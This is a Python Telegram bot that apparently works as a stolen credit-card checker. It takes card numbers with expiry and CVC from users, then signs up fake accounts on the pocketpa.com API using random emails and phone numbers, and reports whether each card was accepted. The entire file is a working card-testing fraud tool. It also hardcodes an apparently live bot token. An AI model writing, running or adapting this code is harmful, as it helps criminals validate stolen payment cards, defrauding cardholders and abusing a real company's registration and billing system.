import telebot
import requests
import random
import string

BOT_TOKEN = "8072279299:AAF7-9MjDIYkoH6iuDztpbSmyQBvz3kRjG0"
bot = telebot.TeleBot(BOT_TOKEN)

def generate_random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{name}@gmail.com"

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "Welcome! Please enter your credit card details in the format:\n"
        "CardNumber|ExpMonth|ExpYear|CVC\n"
        "Example:\n4242424242424242|10|28|123"
    )

@bot.message_handler(func=lambda m: '|' in m.text)
def card_handler(message):
    try:
        card_number, exp_month, exp_year, cvc = map(str.strip, message.text.split('|'))
        
        # Step 1: Get CSRF cookies
        session = requests.Session()
        csrf_resp = session.get("https://api.pocketpa.com/sanctum/csrf-cookie",
                               headers={
                                   "ppa-locale": "en",
                                   "accept": "application/json",
                                   "origin": "https://app.pocketpa.com",
                                   "referer": "https://app.pocketpa.com/"
                               })
        
        # Extract cookies or fallback to empty string
        xsrf_token = session.cookies.get("XSRF-TOKEN", "")
        pocket_pa_session = session.cookies.get("pocket_pa_session", "")
        AWSALB = session.cookies.get("AWSALB", "")
        AWSALBCORS = session.cookies.get("AWSALBCORS", "")
        
        # Prepare registration payload
        payload = {
            "name": "Telegram User",
            "email": generate_random_email(),
            "phone": f"+1{random.randint(2000000000, 9999999999)}",
            "country_code": "1",
            "password": "TempPass123!",
            "locale": "en",
            "plan_id": "price_1NK6JMDuSyQMYtIMfauDnsfM",
            "zip_code": "H0H0H0",
            "card": {
                "number": card_number,
                "exp_month": exp_month,
                "exp_year": exp_year,
                "cvc": cvc
            }
        }
        
        # Step 2: POST to register endpoint with cookies and headers
        headers = {
            "x-xsrf-token": xsrf_token,
            "ppa-locale": "en",
            "accept": "application/json",
            "origin": "https://app.pocketpa.com",
            "referer": "https://app.pocketpa.com/",
            "content-type": "application/json"
        }
        
        cookies = {
            "XSRF-TOKEN": xsrf_token,
            "pocket_pa_session": pocket_pa_session,
            "AWSALB": AWSALB,
            "AWSALBCORS": AWSALBCORS
        }
        
        resp = session.post("https://api.pocketpa.com/api/register",
                            json=payload,
                            headers=headers,
                            cookies=cookies)
        
        if resp.status_code == 200:
            bot.reply_to(message, f"✅ Card Accepted!\nEmail used: {payload['email']}")
        else:
            bot.reply_to(message, f"❌ Card Declined or Error:\n{resp.text}")
    
    except Exception as e:
        bot.reply_to(message, f"Error processing your card info:\n{str(e)}")

bot.infinity_polling()